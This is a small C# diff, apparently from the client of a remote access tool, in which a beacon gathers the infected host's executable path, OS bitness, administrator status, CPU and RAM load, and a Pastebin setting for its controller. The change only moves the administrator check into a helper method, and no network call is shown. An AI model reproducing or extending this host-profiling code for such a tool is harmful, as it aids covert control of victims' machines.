@@ -116,7 +116,7 @@ namespace Client.Sockets
                 Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
             msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
             msgpack.ForcePathObject("Version").AsString = Settings.Version;
-            msgpack.ForcePathObject("Admin").AsString = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString().ToLower().Replace("true", "Administrator").Replace("false", "User");
+            msgpack.ForcePathObject("Admin").AsString = Methods.IsAdmin().ToString().ToLower().Replace("true", "Administrator").Replace("false", "User");
             TheCPUCounter.NextValue();
             msgpack.ForcePathObject("Performance").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
             msgpack.ForcePathObject("Pastebin").AsString = Settings.Pastebin;
